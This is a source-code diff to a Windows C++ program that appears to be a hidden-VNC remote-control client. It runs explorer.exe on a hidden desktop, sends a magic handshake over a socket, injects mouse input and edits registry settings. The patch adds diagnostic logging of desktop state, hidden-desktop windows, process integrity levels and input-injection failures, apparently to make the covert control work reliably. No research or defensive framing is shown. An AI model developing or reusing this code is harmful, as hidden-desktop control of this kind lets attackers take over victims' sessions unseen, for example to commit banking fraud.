@@ -43,6 +43,8 @@ static BOOL       g_gdiplusStarted = FALSE;
 static BOOL       g_lastCaptureFailed = FALSE;
 static char       g_desktopName[MAX_PATH];
 static HWND       g_lastInputHwnd = NULL;
+static DWORD      g_lastDesktopDumpTick = 0;
+static BOOL       g_dumpedInputDesktopState = FALSE;
 static ULARGE_INTEGER lisize;
 static LARGE_INTEGER offset;
 
@@ -99,6 +101,169 @@ static void DescribeWindow(HWND hWnd, char *className, int classNameSize, char *
 
     GetClassNameA(hWnd, className, classNameSize);
     GetWindowTextA(hWnd, title, titleSize);
+}
+
+static BOOL GetDesktopNameA(HDESK hDesk, char *name, DWORD nameSize)
+{
+    if (nameSize)
+        name[0] = 0;
+    if (!hDesk || !name || !nameSize)
+        return FALSE;
+
+    DWORD needed = 0;
+    if (!GetUserObjectInformationA(hDesk, UOI_NAME, name, nameSize, &needed))
+    {
+        if (nameSize)
+            name[0] = 0;
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static void GetProcessImageNameA(DWORD pid, char *image, DWORD imageSize)
+{
+    if (imageSize)
+        image[0] = 0;
+    if (!pid || !image || !imageSize)
+        return;
+
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    if (!hProcess)
+        return;
+
+    DWORD size = imageSize;
+    QueryFullProcessImageNameA(hProcess, 0, image, &size);
+    CloseHandle(hProcess);
+}
+
+static DWORD GetProcessIntegrityRid(DWORD pid)
+{
+    DWORD rid = 0;
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    if (!hProcess)
+        return 0;
+
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
+    {
+        DWORD needed = 0;
+        GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &needed);
+        if (needed)
+        {
+            PTOKEN_MANDATORY_LABEL label = (PTOKEN_MANDATORY_LABEL)Alloc(needed);
+            if (label && GetTokenInformation(hToken, TokenIntegrityLevel, label, needed, &needed))
+            {
+                DWORD subAuthorityCount = *GetSidSubAuthorityCount(label->Label.Sid);
+                rid = *GetSidSubAuthority(label->Label.Sid, subAuthorityCount - 1);
+            }
+            Funcs::pFree(label);
+        }
+        CloseHandle(hToken);
+    }
+
+    CloseHandle(hProcess);
+    return rid;
+}
+
+static void LogDesktopState(const char *stage)
+{
+    char threadDesktopName[128] = { 0 };
+    char hiddenDesktopName[128] = { 0 };
+    char inputDesktopName[128] = { 0 };
+    HDESK threadDesktop = GetThreadDesktop(GetCurrentThreadId());
+    HDESK inputDesktop = OpenInputDesktop(0, FALSE, DESKTOP_READOBJECTS | DESKTOP_SWITCHDESKTOP);
+    DWORD inputDesktopError = 0;
+
+    if (!inputDesktop)
+        inputDesktopError = GetLastError();
+
+    GetDesktopNameA(threadDesktop, threadDesktopName, sizeof(threadDesktopName));
+    GetDesktopNameA(g_hDesk, hiddenDesktopName, sizeof(hiddenDesktopName));
+    if (inputDesktop)
+        GetDesktopNameA(inputDesktop, inputDesktopName, sizeof(inputDesktopName));
+
+    printf("[diag] desktop-state %s threadDesk=0x%p('%s') hiddenDesk=0x%p('%s') inputDesk=0x%p('%s') inputDeskErr=%lu sameThreadHidden=%d sameThreadInput=%d\n",
+        stage,
+        threadDesktop,
+        threadDesktopName,
+        g_hDesk,
+        hiddenDesktopName,
+        inputDesktop,
+        inputDesktopName,
+        inputDesktopError,
+        threadDesktop == g_hDesk,
+        inputDesktop && threadDesktop == inputDesktop);
+
+    if (inputDesktop)
+        CloseDesktop(inputDesktop);
+}
+
+static void LogWindowDetails(const char *stage, HWND hWnd)
+{
+    if (!hWnd)
+    {
+        printf("[diag] window-detail %s hwnd=NULL\n", stage);
+        return;
+    }
+
+    char className[128] = { 0 };
+    char title[128] = { 0 };
+    char image[MAX_PATH] = { 0 };
+    RECT rect = { 0 };
+    DWORD pid = 0;
+    DWORD tid = GetWindowThreadProcessId(hWnd, &pid);
+    DWORD style = (DWORD)GetWindowLongPtrA(hWnd, GWL_STYLE);
+    DWORD exStyle = (DWORD)GetWindowLongPtrA(hWnd, GWL_EXSTYLE);
+    DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
+    GetWindowRect(hWnd, &rect);
+    GetProcessImageNameA(pid, image, sizeof(image));
+    DWORD ilRid = GetProcessIntegrityRid(pid);
+
+    printf("[diag] window-detail %s hwnd=0x%p class='%s' title='%s' pid=%lu tid=%lu ilRid=0x%lx visible=%d enabled=%d style=0x%lx exStyle=0x%lx rect=(%ld,%ld,%ld,%ld) exe='%s'\n",
+        stage,
+        hWnd,
+        className,
+        title,
+        pid,
+        tid,
+        ilRid,
+        IsWindowVisible(hWnd),
+        IsWindowEnabled(hWnd),
+        style,
+        exStyle,
+        rect.left,
+        rect.top,
+        rect.right,
+        rect.bottom,
+        image);
+}
+
+static BOOL CALLBACK LogDesktopWindowProc(HWND hWnd, LPARAM lParam)
+{
+    int *count = (int *)lParam;
+    if (*count >= 40)
+        return FALSE;
+
+    char stage[64];
+    wsprintfA(stage, "enum[%02d]", *count);
+    LogWindowDetails(stage, hWnd);
+    ++(*count);
+    return TRUE;
+}
+
+static void DumpHiddenDesktopWindows(const char *reason)
+{
+    DWORD now = GetTickCount();
+    if (g_lastDesktopDumpTick && now - g_lastDesktopDumpTick < 10000)
+        return;
+    g_lastDesktopDumpTick = now;
+
+    printf("[diag] hidden-desktop-window-dump reason=%s\n", reason ? reason : "unknown");
+    LogDesktopState("dump");
+    int count = 0;
+    if (!EnumDesktopWindows(g_hDesk, LogDesktopWindowProc, (LPARAM)&count))
+        printf("[diag] EnumDesktopWindows failed: GetLastError=%lu\n", GetLastError());
+    printf("[diag] hidden-desktop-window-dump count=%d\n", count);
 }
 
 static BOOL ShouldLogInput(UINT msg)
@@ -253,9 +418,14 @@ static BOOL InjectMouseInput(UINT msg, WPARAM wParam, LPARAM lParam, POINT scree
 {
     SetLastError(0);
     BOOL moved = SetCursorPos(screenPoint.x, screenPoint.y);
+    DWORD moveError = GetLastError();
     DWORD flags = MouseFlagsForMessage(msg);
     if (msg == WM_MOUSEMOVE)
+    {
+        if (!moved)
+            printf("[input] SetCursorPos failed for mousemove screen=(%ld,%ld) lastError=%lu\n", screenPoint.x, screenPoint.y, moveError);
         return moved;
+    }
     if (!flags)
         return FALSE;
 
@@ -265,7 +435,12 @@ static BOOL InjectMouseInput(UINT msg, WPARAM wParam, LPARAM lParam, POINT scree
     if (msg == WM_MOUSEWHEEL)
         inputEvent.mi.mouseData = GET_WHEEL_DELTA_WPARAM(wParam);
 
+    SetLastError(0);
     UINT sent = SendInput(1, &inputEvent, sizeof(inputEvent));
+    DWORD sendError = GetLastError();
+    if (!moved || sent != 1)
+        printf("[input] mouse-inject-detail %s moved=%d moveErr=%lu sendInput=%u sendErr=%lu screen=(%ld,%ld)\n",
+            InputMsgName(msg), moved, moveError, sent, sendError, screenPoint.x, screenPoint.y);
     if (sent == 1 && (msg == WM_LBUTTONDBLCLK || msg == WM_RBUTTONDBLCLK || msg == WM_MBUTTONDBLCLK))
     {
         INPUT upEvent = inputEvent;
@@ -1101,6 +1276,7 @@ static DWORD WINAPI InputThread(LPVOID param)
         printf("[diag] Input thread attached to desktop: %s\n", g_desktopName);
     else
         printf("[!] Input thread SetThreadDesktop failed\n");
+    LogDesktopState("input-thread-start");
 
     if (!SendAll(s, gc_magik, (int)sizeof(gc_magik)))
     {
@@ -1123,6 +1299,11 @@ static DWORD WINAPI InputThread(LPVOID param)
     }
 
     printf("[+] Input channel ready; session id=%d\n", sessionId);
+    if (!g_dumpedInputDesktopState)
+    {
+        g_dumpedInputDesktopState = TRUE;
+        DumpHiddenDesktopWindows("input-ready");
+    }
 
     g_hDesktopThread = Funcs::pCreateThread(NULL, 0, DesktopThread, (LPVOID)(ULONG_PTR)(DWORD)sessionId, 0, 0);
     if (g_hDesktopThread)
@@ -1177,7 +1358,20 @@ static DWORD WINAPI InputThread(LPVOID param)
             startupInfo.cb = sizeof(startupInfo);
             startupInfo.lpDesktop = g_desktopName;
             PROCESS_INFORMATION processInfo = { 0 };
-            Funcs::pCreateProcessA(explorerPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+            SetLastError(0);
+            BOOL createdExplorer = Funcs::pCreateProcessA(explorerPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+            printf("[diag] startExplorer CreateProcess path='%s' desktop='%s' result=%s pid=%lu tid=%lu lastError=%lu\n",
+                explorerPath,
+                g_desktopName,
+                createdExplorer ? "ok" : "failed",
+                createdExplorer ? processInfo.dwProcessId : 0,
+                createdExplorer ? processInfo.dwThreadId : 0,
+                GetLastError());
+            if (createdExplorer)
+            {
+                Funcs::pCloseHandle(processInfo.hThread);
+                Funcs::pCloseHandle(processInfo.hProcess);
+            }
 
             APPBARDATA appbarData;
             appbarData.cbSize = sizeof(appbarData);
@@ -1194,6 +1388,7 @@ static DWORD WINAPI InputThread(LPVOID param)
 
             Funcs::pRegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE *)&value, size);
             Funcs::pRegCloseKey(hKey);
+            DumpHiddenDesktopWindows("after-startExplorer");
             break;
         }
         case WmStartApp::startRun:
@@ -1271,6 +1466,8 @@ static DWORD WINAPI InputThread(LPVOID param)
                     LogInputTarget("drop-no-window", msg, NULL, point, emptyPoint, FALSE);
                 continue;
             }
+            if (ShouldLogInput(msg))
+                LogWindowDetails("window-from-point", hWnd);
 
             if (msg == WM_LBUTTONUP)
             {
@@ -1386,7 +1583,15 @@ static DWORD WINAPI InputThread(LPVOID param)
             g_lastInputHwnd = hWnd;
 
             if (msg == WM_LBUTTONDOWN)
+            {
+                LogWindowDetails("final-mouse-target", hWnd);
+                char className[128] = { 0 };
+                char title[128] = { 0 };
+                DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
+                if (!lstrcmpiA(className, "UserOOBEWindowClass"))
+                    DumpHiddenDesktopWindows("target-UserOOBEWindowClass");
                 TryActivateInputTarget(hWnd, msg);
+            }
         }
         else
         {
